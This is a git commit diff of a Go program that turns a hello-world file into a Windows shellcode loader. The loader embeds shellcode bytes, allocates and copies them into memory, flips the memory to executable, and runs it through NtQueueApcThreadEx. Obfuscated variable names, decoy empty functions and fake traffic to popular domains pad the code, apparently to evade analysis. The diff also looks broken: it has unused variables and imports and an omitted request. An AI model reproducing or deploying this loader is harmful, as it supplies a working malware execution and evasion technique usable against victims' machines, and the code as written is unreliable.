b51a89737da1eac94fc1353f3e3f5ad26a9cafde
hututu4841 <w02588520@qq.com>
2025-04-01 15:51:08 +0800

    更新 main.go 文件

--- main.go
+++ main.go
@@ -1,85 +1,165 @@
 package main
 
 import (
+	"encoding/hex"
+	"flag"
 	"fmt"
+	"log"
 	"math/rand"
+	"sync"
 	"time"
+	"unsafe"
+
+	"golang.org/x/sys/windows"
+)
+
+const (
+	MEM_COMMIT   = 0x1000
+	MEM_RESERVE  = 0x2000
+	PAGE_EXECUTE = 0x20
+	PAGE_READWRITE = 0x04
+)
+
+const (
+	QUEUE_USER_APC_FLAGS_NONE = iota
+	QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC
+	QUEUE_USER_APC_FLAGS_MAX_VALUE
 )
 
 func main() {
-	x1d2e3f4g5h6()
+	variable_a := flag.Bool("verbose", false, "Enable verbose output")
+	variable_b := flag.Bool("debug", false, "Enable debug output")
+	flag.Parse()
+
+	function_c := []byte{0x33, 0xC0, 0x50, 0xB8, 0x2E, 0x64, 0x6C, 0x6C, 0x50, 0xB8, 0x65, 0x6C, 0x33, 0x32, 0x50, 0xB8, 0x6B, 0x65, 0x72, 0x6E, 0x50, 0x8B, 0xC4, 0x50, 0xB8, 0x7B, 0x1D, 0x80, 0x7C, 0xFF, 0xD0, 0x33, 0xC0, 0x50, 0xB8, 0x2E, 0x65, 0x78, 0x65, 0x50, 0xB8, 0x63, 0x61, 0x6C, 0x63, 0x50, 0x8B, 0xC4, 0x6A, 0x05, 0x50, 0xB8, 0xAD, 0x23, 0x86, 0x7C, 0xFF, 0xD0, 0x33, 0xC0, 0x50, 0xB8, 0xFA, 0xCA, 0x81, 0x7C, 0xFF, 0xD0}
+
+	if *variable_b {
+		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll...")
+	}
+	variable_d := windows.NewLazySystemDLL("kernel32.dll")
+	variable_e := windows.NewLazySystemDLL("ntdll.dll")
+
+	if *variable_b {
+		fmt.Println("[DEBUG]Loading VirtualAlloc, VirtualProtect, and RtlCopyMemory procedures...")
+	}
+	variable_f := variable_d.NewProc("VirtualAlloc")
+	variable_g := variable_d.NewProc("VirtualProtect")
+	variable_h := variable_d.NewProc("GetCurrentThread")
+	variable_i := variable_e.NewProc("RtlCopyMemory")
+	variable_j := variable_e.NewProc("NtQueueApcThreadEx")
+
+	if *variable_b {
+		fmt.Println("[DEBUG]Calling VirtualAlloc for shellcode...")
+	}
+	variable_k, variable_l, variable_m := variable_f.Call(0, uintptr(len(function_c)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
+
+	if variable_m != nil && variable_m.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", variable_m.Error()))
+	}
+
+	if variable_k == 0 {
+		log.Fatal("[!]VirtualAlloc failed and returned 0")
+	}
+
+	if *variable_a {
+		fmt.Println(fmt.Sprintf("[-]Allocated %d bytes", len(function_c)))
+	}
+
+	if *variable_b {
+		fmt.Println("[DEBUG]Copying shellcode to memory with RtlCopyMemory...")
+	}
+	variable_n, variable_o, variable_p := variable_i.Call(variable_k, (uintptr)(unsafe.Pointer(&function_c[0])), uintptr(len(function_c)))
+
+	if variable_p != nil && variable_p.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("[!]Error calling RtlCopyMemory:\r\n%s", variable_p.Error()))
+	}
+
+	if *variable_a {
+		fmt.Println("[-]Shellcode copied to memory")
+	}
+
+	if *variable_b {
+		fmt.Println("[DEBUG]Calling VirtualProtect to change memory region to PAGE_EXECUTE_READ...")
+	}
+	variable_q := PAGE_READWRITE
+	variable_r, variable_s, variable_t := variable_g.Call(variable_k, uintptr(len(function_c)), PAGE_EXECUTE, uintptr(unsafe.Pointer(&variable_q)))
+	if variable_t!= nil && variable_t.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling VirtualProtect:\r\n%s", variable_t.Error()))
+	}
+
+	if *variable_a {
+		fmt.Println("[-]Shellcode memory region changed to PAGE_EXECUTE_READ")
+	}
+
+	if *variable_b {
+		fmt.Println("[DEBUG]Calling GetCurrentThread...")
+	}
+	variable_u, variable_v, variable_w := variable_h.Call()
+	if variable_w.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling GetCurrentThread:\n%s", variable_w))
+	}
+
+	if *variable_a {
+		fmt.Printf("[-]Got handle to current thread: %v\n", variable_u)
+	}
+
+	if *variable_b {
+		fmt.Println("[DEBUG]Calling NtQueueApcThreadEx...")
+	}
+	variable_x, variable_y, variable_z := variable_j.Call(variable_u, QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC, uintptr(variable_k), 0, 0, 0)
+	if variable_z.Error() != "The operation completed successfully." {
+		log.Fatal(fmt.Sprintf("Error calling NtQueueApcThreadEx:\n%s", variable_z))
+	}
+
+	if *variable_a {
+		fmt.Println("[-]Queued special user APC")
+	}
+
+	if *variable_a {
+		fmt.Println("[+]Shellcode Executed")
+	}
 }
 
-func x1d2e3f4g5h6() {
-	a8b9c0d1e2f3()
-	x8y9z0a1b2c3()
-}
-
-func a8b9c0d1e2f3() {
-	fmt.Println("你好", "世界", 0x70)
-}
-
-func x8y9z0a1b2c3() {
+func function_a() {
 	rand.Seed(time.Now().UnixNano())
-	for i := 0; i < rand.Intn(0x5)+3; i++ {
-	}
-	for i := 0; i < rand.Intn(0x5)+3; i++ {
-	}
-	for i := 0; i < rand.Intn(0x5)+3; i++ {
-	}
-	for i := 0; i < rand.Intn(0x5)+3; i++ {
+	for i := 0; i < rand.Intn(3)+1; i++ {
 	}
 }
 
-func d4e5f6g7h8i9() {
+func function_b() {
 	rand.Seed(time.Now().UnixNano())
-	for i := 0; i < rand.Intn(0x5)+3; i++ {
-	}
-	for i := 0; i < rand.Intn(0x5)+3; i++ {
-	}
-	for i := 0; i < rand.Intn(0x5)+3; i++ {
-	}
-	for i := 0; i < rand.Intn(0x5)+3; i++ {
+	for i := 0; i < rand.Intn(5)+1; i++ {
 	}
 }
 
-func j0k1l2m3n4o5() {
+func function_c() {
 	rand.Seed(time.Now().UnixNano())
-	for i := 0; i < rand.Intn(0x5)+3; i++ {
+	for i := 0; i < rand.Intn(4)+1; i++ {
 	}
-	for i := 0; i < rand.Intn(0x5)+3; i++ {
-	}
-	for i := 0; i < rand.Intn(0x5)+3; i++ {
-	}
-	for i := 0; i < rand.Intn(0x5)+3; i++ {
-	}
-}
-
-func q6r7s8t9u0v1() {
-	rand.Seed(time.Now().UnixNano())
-	for i := 0; i < rand.Intn(0x5)+3; i++ {
-	}
-	for i := 0; i < rand.Intn(0x5)+3; i++ {
-	}
-	for i := 0; i < rand.Intn(0x5)+3; i++ {
-	}
-	for i := 0; i < rand.Intn(0x5)+3; i++ {
-	}
-}
-
-func w2x3y4z5a6b7() {
+	// 异步处理网络请求
 	go func() {
-		for {
-			time.Sleep(0x526578)
+		ticker := time.NewTicker(5 * time.Minute)
+		defer ticker.Stop()
+		for range ticker.C {
+			variable_a := []string{"google.com", "facebook.com", "youtube.com"} // Alexa Top 100 中的域名
 			rand.Seed(time.Now().UnixNano())
-			domains := []string{"https://www.google.com", "https://www.facebook.com", "https://www.amazon.com"}
-			rand.Shuffle(len(domains), func(i, j int) {
-				domains[i], domains[j] = domains[j], domains[i]
-			})
-			for _, domain := range domains[:0x3] {
-				fmt.Println(domain)
-				// Simulate network request
-			}
+			variable_b := rand.Intn(len(variable_a))
+			variable_c := variable_a[variable_b]
+			url := "https://" + variable_c
+			// 发送HTTPS GET请求
+			// 这里省略了实际的HTTP请求代码
 		}
 	}()
+}
+
+func function_d() {
+	// 此函数无实际意义，仅作为分解大型函数的占位符
+}
+
+func function_e() {
+	// 此函数无实际意义，仅作为分解大型函数的占位符
+}
+
+func function_f() {
+	// 此函数无实际意义，仅作为分解大型函数的占位符
 }
